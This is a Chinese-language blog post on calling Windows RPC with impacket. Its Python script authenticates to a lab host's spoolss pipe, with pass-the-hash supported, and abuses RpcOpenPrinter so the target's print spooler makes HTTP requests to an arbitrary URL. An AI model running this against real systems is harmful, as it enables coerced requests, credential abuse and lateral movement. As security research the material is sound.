0x00 Windows RPC


RPC（Remote Procedure Call）远程过程调用协议，一种通过网络从远程计算机上请求服务，而不需要了解底层网络技术的协议。RPC它假定某些协议的存在，例如TCP/UDP等，为通信程序之间携带信息数据。在OSI网络七层模型中，RPC跨越了传输层和应用层，RPC使得开发，包括网络分布式多程序在内的应用程序更加容易。在Windows操作系统中，RPC（Remote Procedure Call） 已经存在了许久，一些漏洞挖掘研究员也已经将RPC相关的漏洞挖的差不多了。但是想要调用Windows RPC接口完成某些事情，我感觉比直接使用Windows API麻烦很多，最近一直在看Windows RPC相关的知识，也实现了一些小工具，但最终我发现还是impacket香！

0x02 通过RpcOpenPrinter作为代理访问


RpcOpenPrinter 是一个工作在MS-RPRN协议下的监视打印机的句柄方法，方法定义如下：

1DWORD RpcOpenPrinter(
2[in, string, unique] STRING_HANDLE pPrinterName,
3[out] PRINTER_HANDLE* pHandle,
4[in, string, unique] wchar_t* pDatatype,
5[in] DEVMODE_CONTAINER* pDevModeContainer,
6[in] DWORD AccessRequired
7 );


第一个参数pPrinterName是打印机的地址，格式支持:

1Domain Name System (DNS)
2NetBIOS
3Internet Protocol version 4 (IPv4)
4Internet Protocol version 6 (IPv6)
5Universal Naming Convention (UNC)

0x03 impacket的通用开发流程


在阅读了几个impacket官方仓库的示例以后，大致对impacket的调用有了清楚的认识。

示例代码:

 1from impacket.dcerpc.v5 import rprn
 2from impacket.dcerpc.v5.dtypes import NULL
 3from impacket.dcerpc.v5 import transport
 4
 5TS = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
 6IFACE_UUID = rprn.MSRPC_UUID_RPRN
 7
 8if __name__ == '__main__':
 9    username = 'administrator' # 用户名
10    password = 'admin@123'     # 密码
11    domain = ''
12    lmhash = ''
13    nthash = ''
14    rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:192.168.117.141[\pipe\spoolss]')
15    rpctransport.set_credentials(username, password, domain, lmhash, nthash)
16    dce = rpctransport.get_dce_rpc()
17    dce.connect()
18    dce.bind(IFACE_UUID, transfer_syntax=TS)
19    request = rprn.RpcOpenPrinter()
20    target_url = r"http://www.baidu.com/"
21    request['pPrinterName'] = '%s\x00' % target_url
22    request['pDatatype'] = NULL
23    request['pDevModeContainer']['pDevMode'] = NULL
24    request['AccessRequired'] = rprn.SERVER_READ
25    dce.request(request)
26    if rpctransport:
27        rpctransport.disconnect()


首先通过DCERPCTransportFactory获取transport对象，DCERPCTransportFactory主要是为了确定RPC的协议序列，关于协议序列的知识可以通过这个文档了解。上方的示例代码ncacn_np:192.168.117.141[\pipe\spoolss]表示了这个RPC通过命名管道连接。连接成功以后，impacket通过set_credentials完成凭证的设置，说起set_credentials，不得不称赞impacket的开发者，只要使用impacket的set_credentials就能轻松进行PTH，因为set_credentials的参数很友好：

第二步是通过MS-RPCE绑定对象，MSRPC_UUID_RPRN 就是PRRN的UUID。

通过前两步，我们其实可以调用任意RPC对象，并支持PTH认证，最后一步dce.request其实就是调用RPC对象里面的方法。
